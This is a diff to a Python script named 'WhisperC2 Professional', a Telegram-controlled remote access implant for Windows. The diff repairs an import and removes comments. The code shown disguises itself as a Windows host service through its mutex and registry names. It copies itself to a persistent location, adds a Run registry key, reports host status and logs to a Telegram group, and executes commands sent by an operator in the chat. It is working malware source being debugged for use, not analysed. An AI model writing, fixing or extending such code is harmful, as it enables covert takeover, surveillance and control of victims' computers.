@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+from __future__ import annotations          # <-- MUST be before any other import
 # =============================================================================
 # WhisperC2 Professional – Mutex‑Hardened, Persistence‑Fixed, Fully Operational
 # =============================================================================
@@ -8,7 +9,6 @@ from datetime import datetime
 from pathlib import Path
 from urllib.parse import urlparse
 import random, string
-from __future__ import annotations          # <-- enables Python 3.7-3.9 compatibility for 'int | None'
 
 # -----------------------------------------------------------------------------
 # Configuration
@@ -26,7 +26,7 @@ REGISTRY_VALUE  = "WinHostService"
 MUTEX_NAME      = "Global\\WinHostSvc_Mutex"
 
 # -----------------------------------------------------------------------------
-# Single‑instance mutex – PROPERLY CHECKED
+# Single‑instance mutex
 # -----------------------------------------------------------------------------
 mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
 if mutex == 0:
@@ -34,7 +34,6 @@ if mutex == 0:
 if ctypes.windll.kernel32.GetLastError() == 183:
     ctypes.windll.kernel32.CloseHandle(mutex)
     sys.exit(0)
-# No atexit needed – OS reclaims handle on exit
 
 # -----------------------------------------------------------------------------
 # Thread‑safe log buffer
@@ -122,7 +121,6 @@ def send_telemetry(topic_id, status: str) -> bool:
     html_content = generate_telemetry_report(status)
     bio = io.BytesIO(html_content.encode('utf-8'))
     bio.name = f"{SYSTEM_ID}_{status}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
-    # Send to the dedicated topic first (if topic exists)
     if topic_id:
         try:
             bot.send_document(GROUP_CHAT_ID, bio, message_thread_id=topic_id)
@@ -130,15 +128,13 @@ def send_telemetry(topic_id, status: str) -> bool:
             return True
         except Exception as e:
             log_error(f"Telemetry HTML send to topic failed: {e}")
-    # Fallback: send to main group without thread (works for both topic and no-topic modes)
-    bio.seek(0)  # rewind for second send attempt
+    bio.seek(0)
     try:
         bot.send_document(GROUP_CHAT_ID, bio)
         log_success(f"Telemetry HTML sent to main group ({status})")
         return True
     except Exception as e:
         log_error(f"Telemetry HTML to group failed: {e}")
-    # Ultimate fallback: plain text to main group
     plain = f"{'🟢' if status=='online' else '💀'} **{SYSTEM_ID}** {status}\n```\n" + "\n".join([f"[{x['level']}] {x['msg']}" for x in log_lines[-10:]]) + "\n```"
     try:
         bot.send_message(GROUP_CHAT_ID, plain, parse_mode='Markdown')
@@ -166,7 +162,6 @@ def get_or_create_topic() -> int | None:
     if existing:
         try:
             test = bot.send_message(GROUP_CHAT_ID, "🔍", message_thread_id=existing)
-            # Deletion may fail if bot lacks permission – handle gracefully
             try:
                 bot.delete_message(GROUP_CHAT_ID, test.message_id)
             except Exception as del_err:
@@ -201,17 +196,14 @@ def install_persistence() -> bool:
                 shutil.copy2(current, dest_path)
                 log_success(f"Copied to {dest_path}")
             else:
-                # Destination exists but we're not running from it – overwrite
                 try:
                     shutil.copy2(current, dest_path)
                     log_success(f"Overwritten {dest_path}")
                 except PermissionError:
                     log_error("Cannot overwrite existing persistent file – persistence set to existing location only")
-                    # continue anyway to set registry key pointing to existing file
         else:
             log("Already running from persistent location")
 
-        # Always ensure registry Run key points to the persistent binary
         if dest_path.exists():
             with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r'Software\Microsoft\Windows\CurrentVersion\Run',
@@ -362,7 +354,7 @@ def execute_command(cmd_line: str, topic_id):
         return f"❓ Unknown: {cmd}", None
 
 # -----------------------------------------------------------------------------
-# Main – fully corrected, all paths work
+# Main
 # -----------------------------------------------------------------------------
 def main():
     try:
@@ -381,7 +373,6 @@ def main():
 
         if not topic_id:
             log_error("All topic attempts failed – falling back to main group")
-            # topic_id remains None
 
         log(f"Operational: topic_id={topic_id}, persistence={persist_ok}")
 
@@ -394,12 +385,10 @@ def main():
                 if getattr(message, 'message_thread_id', None) != topic_id:
                     return
             else:
-                # Group mode: must contain hostname prefix
                 if not message.text or HOSTNAME_PREFIX not in message.text:
                     return
             text = (message.text or "").strip()
             if not text: return
-            # Remove leading '/' if present
             if text.startswith('/'): text = text[1:]
             # In fallback mode, strip the hostname prefix before execution
             if topic_id is None:
